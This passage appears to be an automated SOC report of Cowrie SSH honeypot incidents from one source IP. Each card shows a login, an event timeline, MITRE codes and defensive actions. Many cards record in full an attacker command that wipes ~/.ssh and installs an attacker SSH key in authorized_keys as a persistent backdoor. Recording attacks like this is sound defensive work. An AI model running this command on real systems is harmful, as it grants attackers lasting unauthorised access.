| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:42:29` | `cowrie.session.connect` |
| `2026-05-01 10:42:29` | `cowrie.client.version` |
| `2026-05-01 10:42:29` | `cowrie.client.kex` |
| `2026-05-01 10:42:30` | `cowrie.login.success` |
| `2026-05-01 10:42:30` | `cowrie.session.params` |
| `2026-05-01 10:42:30` | `cowrie.command.input` |
| `2026-05-01 10:42:30` | `cowrie.command.failed` |
| `2026-05-01 10:42:30` | `cowrie.log.closed` |
| `2026-05-01 10:42:30` | `cowrie.session.params` |
| `2026-05-01 10:42:30` | `cowrie.command.input` |
| `2026-05-01 10:42:30` | `cowrie.session.file_download` |
| `2026-05-01 10:42:30` | `cowrie.log.closed` |
| `2026-05-01 10:42:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3baadf7c92a3

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:42 |
| **Last Seen** | 2026-05-01 10:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:42:32` | `cowrie.session.connect` |
| `2026-05-01 10:42:32` | `cowrie.client.version` |
| `2026-05-01 10:42:33` | `cowrie.client.kex` |
| `2026-05-01 10:42:33` | `cowrie.login.success` |
| `2026-05-01 10:42:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b964612c5f19

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:43 |
| **Last Seen** | 2026-05-01 10:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:43:18` | `cowrie.session.connect` |
| `2026-05-01 10:43:18` | `cowrie.client.version` |
| `2026-05-01 10:43:18` | `cowrie.client.kex` |
| `2026-05-01 10:43:18` | `cowrie.login.success` |
| `2026-05-01 10:43:19` | `cowrie.session.params` |
| `2026-05-01 10:43:19` | `cowrie.command.input` |
| `2026-05-01 10:43:19` | `cowrie.command.failed` |
| `2026-05-01 10:43:19` | `cowrie.log.closed` |
| `2026-05-01 10:43:19` | `cowrie.session.params` |
| `2026-05-01 10:43:19` | `cowrie.command.input` |
| `2026-05-01 10:43:19` | `cowrie.session.file_download` |
| `2026-05-01 10:43:19` | `cowrie.log.closed` |
| `2026-05-01 10:43:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81f1cf3dab76

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:43 |
| **Last Seen** | 2026-05-01 10:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:43:21` | `cowrie.session.connect` |
| `2026-05-01 10:43:21` | `cowrie.client.version` |
| `2026-05-01 10:43:21` | `cowrie.client.kex` |
| `2026-05-01 10:43:22` | `cowrie.login.success` |
| `2026-05-01 10:43:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbb1aea119fc

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:44 |
| **Last Seen** | 2026-05-01 10:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:44:06` | `cowrie.session.connect` |
| `2026-05-01 10:44:06` | `cowrie.client.version` |
| `2026-05-01 10:44:07` | `cowrie.client.kex` |
| `2026-05-01 10:44:07` | `cowrie.login.success` |
| `2026-05-01 10:44:08` | `cowrie.session.params` |
| `2026-05-01 10:44:08` | `cowrie.command.input` |
| `2026-05-01 10:44:08` | `cowrie.command.failed` |
| `2026-05-01 10:44:08` | `cowrie.log.closed` |
| `2026-05-01 10:44:08` | `cowrie.session.params` |
| `2026-05-01 10:44:08` | `cowrie.command.input` |
| `2026-05-01 10:44:08` | `cowrie.session.file_download` |
| `2026-05-01 10:44:08` | `cowrie.log.closed` |
| `2026-05-01 10:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0edf7c6761a0

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:44 |
| **Last Seen** | 2026-05-01 10:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:44:10` | `cowrie.session.connect` |
| `2026-05-01 10:44:10` | `cowrie.client.version` |
| `2026-05-01 10:44:10` | `cowrie.client.kex` |
| `2026-05-01 10:44:11` | `cowrie.login.success` |
| `2026-05-01 10:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9be3613c0d9

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:44 |
| **Last Seen** | 2026-05-01 10:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:44:54` | `cowrie.session.connect` |
| `2026-05-01 10:44:54` | `cowrie.client.version` |
| `2026-05-01 10:44:54` | `cowrie.client.kex` |
| `2026-05-01 10:44:55` | `cowrie.login.success` |
| `2026-05-01 10:44:55` | `cowrie.session.params` |
| `2026-05-01 10:44:55` | `cowrie.command.input` |
| `2026-05-01 10:44:55` | `cowrie.command.failed` |
| `2026-05-01 10:44:55` | `cowrie.log.closed` |
| `2026-05-01 10:44:55` | `cowrie.session.params` |
| `2026-05-01 10:44:55` | `cowrie.command.input` |
| `2026-05-01 10:44:56` | `cowrie.session.file_download` |
| `2026-05-01 10:44:56` | `cowrie.log.closed` |
| `2026-05-01 10:44:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d3cfc63259d

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:44 |
| **Last Seen** | 2026-05-01 10:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:44:58` | `cowrie.session.connect` |
| `2026-05-01 10:44:58` | `cowrie.client.version` |
| `2026-05-01 10:44:58` | `cowrie.client.kex` |
| `2026-05-01 10:44:58` | `cowrie.login.success` |
| `2026-05-01 10:44:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05f2bf5aaacd

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:47 |
| **Last Seen** | 2026-05-01 10:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:47:20` | `cowrie.session.connect` |
| `2026-05-01 10:47:20` | `cowrie.client.version` |
| `2026-05-01 10:47:20` | `cowrie.client.kex` |
| `2026-05-01 10:47:21` | `cowrie.login.success` |
| `2026-05-01 10:47:21` | `cowrie.session.params` |
| `2026-05-01 10:47:21` | `cowrie.command.input` |
| `2026-05-01 10:47:21` | `cowrie.command.failed` |
| `2026-05-01 10:47:21` | `cowrie.log.closed` |
| `2026-05-01 10:47:22` | `cowrie.session.params` |
| `2026-05-01 10:47:22` | `cowrie.command.input` |
| `2026-05-01 10:47:22` | `cowrie.session.file_download` |
| `2026-05-01 10:47:22` | `cowrie.log.closed` |
| `2026-05-01 10:47:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6d5b5749053

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:47 |
| **Last Seen** | 2026-05-01 10:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:47:24` | `cowrie.session.connect` |
| `2026-05-01 10:47:24` | `cowrie.client.version` |
| `2026-05-01 10:47:24` | `cowrie.client.kex` |
| `2026-05-01 10:47:24` | `cowrie.login.success` |
| `2026-05-01 10:47:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c77e3d28b3b

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:49 |
| **Last Seen** | 2026-05-01 10:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:49:00` | `cowrie.session.connect` |
| `2026-05-01 10:49:00` | `cowrie.client.version` |
| `2026-05-01 10:49:00` | `cowrie.client.kex` |
| `2026-05-01 10:49:00` | `cowrie.login.success` |
| `2026-05-01 10:49:01` | `cowrie.session.params` |
| `2026-05-01 10:49:01` | `cowrie.command.input` |
| `2026-05-01 10:49:01` | `cowrie.command.failed` |
| `2026-05-01 10:49:01` | `cowrie.log.closed` |
| `2026-05-01 10:49:01` | `cowrie.session.params` |
| `2026-05-01 10:49:01` | `cowrie.command.input` |
| `2026-05-01 10:49:01` | `cowrie.session.file_download` |
| `2026-05-01 10:49:01` | `cowrie.log.closed` |
| `2026-05-01 10:49:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c83ec5354770

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:49 |
| **Last Seen** | 2026-05-01 10:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:49:03` | `cowrie.session.connect` |
| `2026-05-01 10:49:03` | `cowrie.client.version` |
| `2026-05-01 10:49:03` | `cowrie.client.kex` |
| `2026-05-01 10:49:04` | `cowrie.login.success` |
| `2026-05-01 10:49:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd120de144c3

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:49 |
| **Last Seen** | 2026-05-01 10:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:49:50` | `cowrie.session.connect` |
| `2026-05-01 10:49:50` | `cowrie.client.version` |
| `2026-05-01 10:49:51` | `cowrie.client.kex` |
| `2026-05-01 10:49:51` | `cowrie.login.success` |
| `2026-05-01 10:49:51` | `cowrie.session.params` |
| `2026-05-01 10:49:51` | `cowrie.command.input` |
| `2026-05-01 10:49:51` | `cowrie.command.failed` |
| `2026-05-01 10:49:52` | `cowrie.log.closed` |
| `2026-05-01 10:49:52` | `cowrie.session.params` |
| `2026-05-01 10:49:52` | `cowrie.command.input` |
| `2026-05-01 10:49:52` | `cowrie.session.file_download` |
| `2026-05-01 10:49:52` | `cowrie.log.closed` |
| `2026-05-01 10:49:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b9f6f5c294a

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:49 |
| **Last Seen** | 2026-05-01 10:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:49:54` | `cowrie.session.connect` |
| `2026-05-01 10:49:54` | `cowrie.client.version` |
| `2026-05-01 10:49:54` | `cowrie.client.kex` |
| `2026-05-01 10:49:55` | `cowrie.login.success` |
| `2026-05-01 10:49:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a69a30f738e

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:51 |
| **Last Seen** | 2026-05-01 10:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:51:26` | `cowrie.session.connect` |
| `2026-05-01 10:51:26` | `cowrie.client.version` |
| `2026-05-01 10:51:26` | `cowrie.client.kex` |
| `2026-05-01 10:51:26` | `cowrie.login.success` |
| `2026-05-01 10:51:27` | `cowrie.session.params` |
| `2026-05-01 10:51:27` | `cowrie.command.input` |
| `2026-05-01 10:51:27` | `cowrie.command.failed` |
| `2026-05-01 10:51:27` | `cowrie.log.closed` |
| `2026-05-01 10:51:27` | `cowrie.session.params` |
| `2026-05-01 10:51:27` | `cowrie.command.input` |
| `2026-05-01 10:51:27` | `cowrie.session.file_download` |
| `2026-05-01 10:51:27` | `cowrie.log.closed` |
| `2026-05-01 10:51:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9247a7dcce69

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:51 |
| **Last Seen** | 2026-05-01 10:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:51:29` | `cowrie.session.connect` |
| `2026-05-01 10:51:29` | `cowrie.client.version` |
| `2026-05-01 10:51:30` | `cowrie.client.kex` |
| `2026-05-01 10:51:30` | `cowrie.login.success` |
| `2026-05-01 10:51:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eeeb4a6c816a

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:52 |
| **Last Seen** | 2026-05-01 10:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:52:15` | `cowrie.session.connect` |
| `2026-05-01 10:52:15` | `cowrie.client.version` |
| `2026-05-01 10:52:15` | `cowrie.client.kex` |
| `2026-05-01 10:52:16` | `cowrie.login.success` |
| `2026-05-01 10:52:16` | `cowrie.session.params` |
| `2026-05-01 10:52:16` | `cowrie.command.input` |
| `2026-05-01 10:52:16` | `cowrie.command.failed` |
| `2026-05-01 10:52:16` | `cowrie.log.closed` |
| `2026-05-01 10:52:17` | `cowrie.session.params` |
| `2026-05-01 10:52:17` | `cowrie.command.input` |
| `2026-05-01 10:52:17` | `cowrie.session.file_download` |
| `2026-05-01 10:52:17` | `cowrie.log.closed` |
| `2026-05-01 10:52:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9890f46f961

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:52 |
| **Last Seen** | 2026-05-01 10:52 |
| **Session Duration** | 0s |
